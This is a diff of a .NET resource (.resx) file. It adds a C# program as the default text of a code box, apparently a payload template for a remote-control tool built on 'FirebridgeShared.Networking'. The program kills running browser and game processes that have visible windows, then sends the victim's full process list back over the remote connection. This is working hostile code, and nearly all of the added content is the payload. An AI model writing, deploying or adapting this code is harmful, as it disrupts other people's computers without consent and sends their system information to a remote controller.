@@ -117,10 +117,32 @@
   <resheader name="writer">
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
-  <metadata name="pingTimer.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
-    <value>17, 17</value>
-  </metadata>
-  <metadata name="contextMenuStrip1.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
-    <value>104, 17</value>
-  </metadata>
+  <data name="_tb_code.Text" xml:space="preserve">
+    <value>using System;
+using System.Diagnostics;
+using System.Linq;
+using FirebridgeShared.Networking;
+
+namespace TestApp
+{
+    public static class Program
+    {
+        public static void Main(Connection s)
+        {
+            Process[] AllProcesses = Process.GetProcesses();
+            foreach (var process in AllProcesses)
+            {
+                if (process.MainWindowTitle != "")
+                {
+                    string k = process.ProcessName.ToLower();
+                    if (k == "iexplore" || k == "iexplorer" || k == "chrome" || k == "firefox" || k == "opera" || k == "lfs" || k == "witchit")
+                        process.Kill();
+                }
+            }
+
+            s.SendPacket(new Packet() { Id = 0, Data = String.Join("", "", Process.GetProcesses().Select(p =&gt; p.ProcessName.ToString()).ToArray()) });
+        }
+    }
+}</value>
+  </data>
 </root>
